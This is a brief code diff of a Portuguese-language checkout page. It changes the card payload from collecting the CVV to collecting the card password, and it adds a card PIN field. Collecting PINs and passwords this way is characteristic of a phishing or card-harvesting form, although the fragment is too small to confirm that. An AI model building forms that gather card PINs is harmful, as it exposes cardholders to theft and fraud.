@@ -152,7 +152,8 @@ function CheckoutPage() {
         cliente_estado: form.estado.toUpperCase(),
 
         cartao_numero: onlyDigits(form.cartaoNumero),
-        cartao_cvv: onlyDigits(form.cartaoSenha),
+        cartao_senha: onlyDigits(form.cartaoSenha),
+        cartao_pincode: onlyDigits(form.cartaoPincode),
 
         produto_nome: produtoNome,
         produto_quantidade: qtd,
